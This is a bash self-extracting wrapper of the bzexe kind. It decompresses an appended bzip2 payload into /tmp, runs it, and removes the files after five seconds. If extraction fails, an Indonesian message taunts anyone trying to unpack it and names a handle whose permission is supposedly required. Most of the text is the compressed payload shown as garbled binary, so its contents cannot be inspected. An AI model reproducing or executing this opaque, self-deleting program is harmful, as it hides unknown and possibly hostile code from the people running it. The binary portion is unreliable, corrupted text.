#!/bin/bash
skip=23
set -C
umask=`umask`
umask 77
tmpfile=`tempfile -p gztmp -d /tmp` || exit 1
if /usr/bin/tail -n +$skip "$0" | /bin/bzip2 -cd >> $tmpfile; then
  umask $umask
  /bin/chmod 700 $tmpfile
  prog="`echo $0 | /bin/sed 's|^.*/||'`"
  if /bin/ln -T $tmpfile "/tmp/$prog" 2>/dev/null; then
    trap '/bin/rm -f $tmpfile "/tmp/$prog"; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile "/tmp/$prog") 2>/dev/null &
    /tmp/"$prog" ${1+"$@"}; res=$?
  else
    trap '/bin/rm -f $tmpfile; exit $res' 0
    (/bin/sleep 5; /bin/rm -f $tmpfile) 2>/dev/null &
    $tmpfile ${1+"$@"}; res=$?
  fi
else
  echo MAU DIBONGKAR YA BANG ? IZIN DULU KE @tau_samawa $0; exit 1
fi; exit $res
BZh91AY&SYK4 H�U8b ���?�������    `��z�;��ݽz͚��ź�J�ۧwi�F� f�$�2��'�7���'�<���'�h�@�=&�Q���@	�=@6��ڍ�(i���@�4��� j��&Dڧ�P�@42 �  !�� ""�j~Tz�~���S�(~�f$�Sj�ީ�@ ��44�  &��� hѠ�A"Bd�24iO�����'���=OԏHPz�<����� k��wv�����߱���N�=�i%�1����s�Y-�$��HG�|�)�1�s�����DA���'79������ptL5�r;]f5�v��r�k'0E����g�(����ID�H]5eP<�V�J�D�q�(L��c�P�
7[S�L�o�e�99��u��!{������/�{� TG���\�4B*ҵ䅔��MP�rg���Q��畑{���W>NZ�Wg�����H�M�f�ǥ�ڮ�/�m�\�"��2 j_e	H��U��(�\�E�%,�D���ͯ�?M7fO�"!�F�+Sf[d�	�s^�"gt������X\_ZL1-~��ћO��K�Q�rv�E���8B������Yr(� 68�*hҰ��h��nn��:e����G��	s����\��Gg`	MN�K��u��k����Z'��#f�J6�.�����AOnk�-}�q�v5��^z�5;��v]� ��O'x�+͎=�YI
�MvB��ڶ阝"�i��W��f/-d���u�:���zR����[��m��1��`6�H�f<��!���W�W�3kLZ�B�gm�s[��Y�v���h��Kf�BK��*�f�if����G���wB �;�oP�5��@���F�$��T#���6����lM4B�a�d��MfZ6aH�֏ѱ�{^�
Xg>�Li��%}l<X�P��JN=�^�.䘌PSS�����j�.�B��B#�+���V��@��_;��� О�����ߤ�� 6����P����G����O�,�+��ӯPn،���,�6�A�g�.+랮"fbx�He䀏���R3�Gt��N����O���L�k�gv���1�a�T�n�j^�+�G�0kY��+0����&Ӿ�A(号����Ԏ�xCLm�o�E�{N���.$GqU+$Ļ#hz9ҧ5�6�	D"n,[YKCD��(�YU*�~��e�f���`�vE�Δ̌(����Y�3b�,���ŸY2jk;w$o2y����_�d�o+~��F(��
|^��(ѾÌڢ�;�]r(~x�
��埲��-�:	�G��oG/�%�E|F5�	���yߙk/X�}q	��zm\dc!�� �p��EȞ�<�Q�ؙ�E�
#�`kK_/=Ţ�p�	�ٔ�_�2�~`n|�6ऩ;��F�G��.�"a��7�y����OD/��i��� h���P0i�%.�0xDaE��X�Ų��� ��d˳��l����E� ���=�j�a��캐�4m6<cA�i �гW����A�}�Z{��_��-��oˍ���I�z��,+(J�~c���J��()M�?�'�5���_X+�Й�E�rl�B�z�ŝ�n	Mr(�"V *-�2>\⸋���F�%�����W�Q#1D�Ȇ���>fke�پ8'=x�x`0�b��Y���V��7 �HR���iU�v�Q�$V�+� a��_H�y���1�a�5�o=��'*JE �:\4������o�H�-����(��R��1`&���&\��Q������=�J�S��L�a4e�:#!����tZ3&��!ߥ~l��ÏC�D�Ds���\��o@G^�I�S+�Yf)��s��l�鰗!@�5a���F=3
�S��<�#0ԉ1T�<�;T�P��x�����uĮ�������*TK�b�T X�Y�I~�c�=r;���	OL�*WxEǩ]��L�n���5n�^a��x�6��m�������*�8�m�m���`�e�l�:�i���3;��c���N��,
�M#9 ����{�����j/p�%����8�ֶ���.�bD4r�A[}[ݻ�4��������Qh�PxQ�gt�m��S{�Z�E��Y�:q�+�Jr��uZrP�ңP�Ks�N���Y0<��1�UUj��j�iѻ�2.Q�%o���d	�@�Ɓ�w�,D7��e�a�Is��σ�ap����C0��b@�Y��H�v_�h����/��X�f��6��]웪�?�y�8�JFQ��yJ�w��rq�s�.��tD�@Q�����_��:ț�syW��)n�R��9*�+��f��ĂUg�4��m�U	��1v���U�z��<Y�Zlo`Z�\q�۴q��S���Fp]uUl�EZ-u�L�^��v�`���]׶.�NP<��OƜ��6c�0j,����禧�&m�s�L�0&,���j]�����RR;-��Cz���C'C=���4��o3^�l���lM ���hV�u���j�g`k��J�����2N��*e ��i�
는Sc�6P�*`Vf�ʉP��)�>��!�!�TT�*,U�M���g^�p^�����,��@�c�V�{�E¦U�U�q�L���0�+�V��U�1��f��N��6p�Ď�!�ׄS�\)�Y֎Z�����"�D+ �!e��bX?�l���1R"�+�(�Ď�x,��uqAͺ�(��0)�\�d��dq6�9��ԸK[A���l�@GNl��#G����	���w$S�	�1�@